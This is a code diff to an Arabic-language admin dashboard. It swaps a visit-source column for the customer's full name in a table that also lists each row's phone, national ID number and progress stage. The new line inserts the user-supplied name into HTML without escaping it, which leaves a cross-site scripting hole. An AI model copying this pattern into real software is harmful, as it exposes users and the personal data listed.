@@ -330,7 +330,7 @@
                     <thead>
                         <tr>
                             <th>الدولة</th>
-                            <th>مصدر الزيارة</th>
+                            <th>الاسم</th>
                             <th>الهاتف</th>
                             <th>الهوية</th>
                             <th>المرحلة</th>
@@ -528,12 +528,14 @@
                     `;
                 }
 
-                const sourceText = order.visitSource && order.visitSource !== 'Direct' ? order.visitSource : (order.referrer ? order.referrer.substring(0, 30) : 'مباشر');
+                // اسم العميل من personalData
+                const customerName = order.personalData?.fullname || '';
+                const nameText = customerName ? customerName : '<span style="color:#999;font-size:11px">بانتظار الاسم...</span>';
 
                 return `
                     <tr class="${rowClass}">
                         <td>${flag} ${order.country || 'غير معروف'}</td>
-                        <td style="font-size:11px;color:#555;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${order.visitSource || ''} ${order.referrer || ''}">${sourceText}</td>
+                        <td>${nameText}</td>
                         <td>${order.personalData?.phone || '-'}</td>
                         <td>${order.personalData?.id_number || '-'}</td>
                         <td><span class="stage-badge stage-${state.stage || 'unknown'}">${stageLabel}</span></td>
